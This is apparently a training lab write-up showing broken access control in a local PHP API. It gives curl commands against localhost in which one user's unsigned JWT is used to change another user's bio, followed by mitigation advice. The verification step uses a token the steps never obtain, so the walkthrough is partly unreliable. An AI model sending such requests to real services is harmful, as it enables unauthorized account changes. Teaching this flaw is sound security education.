
# Lab 0x05: Broken Access Control 📜👾

## 🔓 Understanding Broken Access Control

### 🎯 Introduction to Broken Access Control
Broken Access Control (BAC) occurs when restrictions on what authenticated users are allowed to do are not properly enforced. Attackers can exploit these flaws to access unauthorized functionality or data.

---

## 🌐 API Index Overview
Here are the API endpoints provided in the lab:

1️⃣ **Login Endpoint**
- **Method:** POST  
- **Endpoint:** `/login.php`
- **Command:**  
  ```bash
  curl -X POST -H "Content-Type: application/json" -d '{"username": "admin", "password": "password123"}' http://localhost/labs/api/login.php
  ```

2️⃣ **Account Information Endpoint**
- **Method:** GET  
- **Endpoint:** `/account.php`
- **Command:**  
  ```bash
  curl -X GET "http://localhost/labs/api/account.php?token=JWT"
  ```

3️⃣ **Update Account Endpoint**
- **Method:** PUT  
- **Endpoint:** `/account.php`
- **Command:**  
  ```bash
  curl -X PUT -H "Content-Type: application/json" -d '{"token": "JWT", "username":"username", "bio": "New bio information."}' http://localhost/labs/api/account.php
  ```

---

## 🛠️ Exploiting Broken Access Control

### 🧪 Test Scenario
1. **User 1 (Jeremy):** Login and receive JWT token.  
2. **User 2 (Jessamy):** Login and attempt to use Jeremy's token to update Jessamy's bio.

---

### 📝 Step-by-Step Exploitation

1️⃣ **Login as Jeremy**
```bash
curl -X POST -H "Content-Type: application/json" -d '{"username": "jeremy", "password": "cheesecake"}' http://localhost/labs/api/login.php
```
- **Response:** Successful login with a JWT token for Jeremy:  
  `{"status":"success","token":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVyZW15Iiwicm9sZSI6InN0YWZmIn0=."}`

2️⃣ **Attempt to Update Jessamy’s Bio Using Jeremy's Token**
```bash
curl -X PUT -H "Content-Type: application/json" -d '{"token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVyZW15Iiwicm9sZSI6InN0YWZmIn0=.", "username":"jessamy", "bio": "BFLA bio."}' http://localhost/labs/api/account.php
```
- **Outcome:** The bio update succeeds due to broken access control:  
  `{"status":"success","message":"Bio updated successfully"}`

3️⃣ **Verify the Update**
```bash
curl -X GET "http://localhost/labs/api/account.php?token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVzc2FteSIsInJvbGUiOiJhZG1pbiJ9."
```
- **Response:**  
  `{"username":"jessamy","role":"admin","bio":"BFLA bio."}`

---

## 🚨 Analysis of Broken Access Control

### Problem:
The API improperly validates JWT tokens, allowing one user’s token to perform actions on behalf of another user.

### Implications:
This vulnerability could lead to unauthorized actions, data leaks, or account takeovers.

---

## 🛡️ Mitigation Strategies
1. **Validate User Tokens:**  
   Ensure that every sensitive action validates that the user’s token matches the intended user's ID stored within the token.
2. **Regular Audits:**  
   Perform security audits on API endpoints to ensure access controls are enforced.

---

## 📚 Conclusion
This scenario highlights the importance of robust access control systems in protecting user data and preventing unauthorized actions. Always enforce and verify permissions rigorously.
